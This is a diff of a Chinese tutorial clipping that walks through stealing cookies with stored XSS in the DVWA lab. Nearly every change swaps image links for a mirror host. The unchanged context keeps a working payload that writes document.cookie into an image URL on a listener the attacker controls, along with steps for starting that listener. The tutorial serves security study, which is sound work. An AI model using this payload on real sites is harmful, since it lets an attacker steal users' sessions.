@@ -9,7 +9,7 @@ description: "目录 概念 姿势及Payload 启动HTTP协议 method1 启动HTTP
 tags:
   - "clippings"
 ---
-[![](https://img2024.cnblogs.com/blog/35695/202412/35695-20241201073014811-1847930772.jpg)](https://www.doubao.com/?channel=cnblogs&source=hw_db_cnblogs&type=lunt&theme=bianc)
+[![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/a32f2de6953cc1287965374ec24bc047.jpg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/a32f2de6953cc1287965374ec24bc047.jpg)
 
 ---
 
@@ -171,7 +171,7 @@ python3 -m http.server 8080(端口号)
 本文以 **DVWA之XSS(Stored) low-level为例** ，通过DVWA本地环境进行XSS之Cookie外带例题详析。
 
 1. 写入python文件，以 **test.py** 命名，IP为 **本机IPv4地址** ，端口为 **2022** ，启动监听  
-	![在这里插入图片描述](https://img-blog.csdnimg.cn/ccad27fa432644f58c47ae7f87247251.png)
+	![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/86aee2a0fce67518cfae10a740b8b862.png)
 2. 在页面执行 XSS 的 Cookie外带攻击，使目标机向指定的IP地址发送Cookie
 
 ### Payload1
@@ -179,17 +179,17 @@ python3 -m http.server 8080(端口号)
 Name栏输入： `1`  
 Message栏输入： `<script>document.write('<img src="http://IPv4地址:2022/'+document.cookie+'"/>')</script>`
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/ebec4fc82dd544568d686e937fea0ff5.png#pic_center)  
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/27534b8dc2f65963e67017297d98011d.png)  
 绕过Message栏的字符串长度限制可参考：  
 [\[网络安全\]DVWA之XSS(Stored)攻击姿势及解题详析合集  
 ](https://blog.csdn.net/2301_77485708/article/details/130744511?spm=1001.2014.3001.5501)
 
 如下图，XSS语句注入成功：  
-![在这里插入图片描述](https://img-blog.csdnimg.cn/c75dcc9387d34eeea890f43904e0c169.png#pic_center)
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/c6777fda063881b0c29738291941180d.png)
 
 端口监听到数据：
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/46038515b9fd4f98ab9ef71cb1852e37.png#pic_center)
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/fbfad8d18190e131f6f4a721a264bb7e.png)
 
 ### Payload2
 
@@ -217,10 +217,10 @@ window.open("http://www.example.com",
 ---
 
 如下图，XSS语句注入成功：  
-![在这里插入图片描述](https://img-blog.csdnimg.cn/9cde3e57340b4c74a3a52f593b357be9.png#pic_center)
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/faa4777a405986d8f05e57a46f80a495.png)
 
 页面跳转并传递cookie：  
-![在这里插入图片描述](https://img-blog.csdnimg.cn/28d08355ff51401395c801da7b06fda3.png#pic_center)
+![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/5d64ee4b7ff2d7cbaa20bc80259920c5.png)
 
 ---
 
